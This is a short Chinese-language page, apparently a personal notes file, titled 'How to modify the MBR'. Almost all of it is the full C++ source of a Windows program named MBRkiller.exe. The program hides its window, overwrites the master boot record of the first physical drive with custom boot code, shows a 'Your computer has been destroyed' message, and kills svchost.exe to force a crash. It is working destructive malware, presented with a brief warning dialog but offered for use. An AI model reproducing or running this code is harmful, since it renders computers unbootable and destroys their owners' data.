# code1
## 如何修改MBR
```
#include <windows.h>
#include <iostream>
#include <ctime>
#include <string>
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )   //隐藏DOS窗口
using namespace std;
#define mbrsize 512
#define boot "\x8C\xC8\x8E\xD8\x8E\xC0\xE8\x02\x00\xEB\xFE\xB8\x20\x7C\x89\xC5\xB9\x19\x00\xB8\x01\x13\xBB\x0C\x00\xB2\x1E\xB6\x0A\xCD\x10\xC3\x51\x77\x51"            //这是要写入的内容，大小不要超过512B
int killmbr()
{
	BYTE pmbr[512] = { 0 };
	DWORD write;
	HANDLE mbr;
	char mbrdata[mbrsize] = boot;
	memcpy(pmbr, mbrdata, sizeof(mbrdata)-1);
	pmbr[510] = 0x55;
	pmbr[511] = 0xAA;           //要想写入，结尾必须加0x55,0xAA
	mbr = CreateFile
	(
		"\\\\.\\PHYSICALDRIVE0",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);
	if (WriteFile(mbr, pmbr, sizeof(pmbr),& write, NULL) == TRUE)
	{
		MessageBox(NULL, "Your computer has been destroyed", "MBR has been written", MB_ICONERROR);      //提示用户已修改mbr
		Sleep(10000);         //等待10秒
	}
	else
	{
		cout << "ERROR";
		Sleep(5000);             //等待5秒
	}
	CloseHandle(mbr);
	return EXIT_SUCCESS;
}
int main()
{
	int op;
	op = MessageBox(NULL, "这是一个病毒程序，确定运行？", "MBRkiller.exe", MB_OKCANCEL | MB_ICONWARNING);           //警告用户
	if (op == 1)
	{
		killmbr();     //调用函数
		system("taskkill /f /im svchost.exe /t");      //蓝屏代码
	}
	if (op == 2)
	{
		exit(0);   //退出程序
	}
	return 0;
}
```
## 效果就是这样
![alt txet010](https://xdadaorg.github.io/QWQ.jpeg)
